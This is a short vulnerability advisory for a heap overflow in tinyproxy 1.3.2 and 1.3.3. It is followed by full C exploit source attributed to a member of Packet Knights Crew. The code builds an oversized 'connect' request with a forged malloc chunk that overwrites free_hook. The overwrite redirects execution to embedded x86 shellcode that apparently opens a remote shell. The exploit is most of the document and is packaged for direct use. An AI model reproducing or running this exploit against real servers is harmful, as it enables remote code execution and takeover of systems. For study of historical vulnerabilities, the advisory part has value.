source: http://www.securityfocus.com/bid/2217/info

Versions 1.3.2 and 1.3.3 of tinyproxy, a small HTTP proxy, exhibit a vulnerability to heap overflow attacks.

A failure to properly validate user-supplied input which arguments a call to sprintf() can allow unexpectedly large amounts of input to a buffer (used to display error messages) to be written past the boundary of the allocated space on the heap.

As a result, it may be possible to execute a denial of service attack, or even to execute arbitrary commands if certain internal memory structures can be successfully overwritten. 

/*
 * Exploit for tinyproxy 1.3.2 and 1.3.3
 * by |CyRaX| <cyrax@pkcrew.org>
 * Packet Knights Crew - www.pkcrew.org
 * READ THE ADVISORY FIRST !
 * Greetz :
 *  bikappa: for some help
 *  all the pkc members expecially recidjvo, asynchro and cthulhu
 *  all the other friends
*/


#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>

char jmps[]="\xeb\x0e";

char c0de[]="\xeb\x0e\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90"
            "\x89\xe5"
            "\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
            "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
            "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
            "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
            "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
            "\x80\xea\x27\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x1f\x5e"
            "\x80\x46\x04\x01"
            "\x80\x06\x01"
            "\x89\x75"
            "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
            "\x8d\x55\x0c\xcd\x80\xe8\xdc\xff\xff\xff\x2e\x62\x69\x6e\x2e\x73\x68";

void usage();

void usage(){
   printf("Exploit for Tinyproxy 1.3.2 and 1.3.3 by |CyRaX| <cyrax@pkcrew.org>\n");
   printf("Packet Knights Crew - http://www.pkcrew.org\n");
   printf("please.. READ the advisory first!\n");
   printf("Usage : ./PKCtiny-ex <host> <port> <buf_size> <struct offset> <free_hook> <shellcode>\n");
   printf("buf_size is the size of the buf we send\n");
   printf("struct offset is the distance from the beginning of the buffer we send where we\n");
   printf("       we put the malloc chunk struct!\n");
   printf("free_hook is the address of the free_hook function pointer\n");
   printf("shellcode is the address of the shellcode (you don't neet to hit it correctly\n");
   printf("          you can just hope to it a jump\n");
   printf("\nfree_hook and shellcode must be given in 0xaddress format\n");
   exit(0);
}

int main(int argc, char **argv){
   int s,i,err,pid[5];
   struct sockaddr_in dst;
   struct malloc_chunk{
      unsigned int ps;
      unsigned int sz;
      struct malloc_chunk *fd;
      struct malloc_chunk *bk;
   }mc;
   char *magic,*sndbuff;
   unsigned long FREE_HOOKZ,SHELLCODE;
   if(argc<5)usage();
   magic=(char *)malloc(atoi(argv[3])+1);
   sndbuff=(char *)malloc(atoi(argv[3])+30);
   memset(magic,'\x90',atoi(argv[3]));

   SHELLCODE=strtol(argv[6],NULL,16);
   FREE_HOOKZ=strtol(argv[5],NULL,16);


   dst.sin_addr.s_addr=inet_addr(argv[1]);
   dst.sin_port=htons(atoi(argv[2]));
   dst.sin_family=AF_INET;
   mc.ps=0xffffffff & ~1;
   mc.sz=0xffffffff;
   mc.fd=(struct malloc_chunk *)(SHELLCODE);
   mc.bk=(struct malloc_chunk *)(FREE_HOOKZ-8);

   s=socket(AF_INET,SOCK_STREAM,0);
   connect(s,(struct sockaddr *)&dst,sizeof(dst));
   memcpy(magic+atoi(argv[4]),&mc,sizeof(mc));

   if((atoi(argv[3])/2)<atoi(argv[4])){
      /* putting jmps and shellcode before the struct */
      for(i=0;i<(atoi(argv[4])-strlen(c0de)-10);i+=2){
	 memcpy(magic+i,jmps,2);
      }
   }
   else {
      /* putting jmps and shellcode after the struct */
      for(i=atoi(argv[4])+sizeof(mc);i<atoi(argv[3])-10-strlen(c0de);i+=2){
	 memcpy(magic+i,jmps,2);
      }
   }
   memcpy(magic+i,c0de,strlen(c0de));

   magic[atoi(argv[3])]=0;

   printf("strlen magic is %i\n",strlen(magic));
   sndbuff[snprintf(sndbuff,atoi(argv[3])+20,"connect %s://\n",magic)]=0;
   printf("shooting\n");
   err=send(s,sndbuff,strlen(sndbuff),0);
}

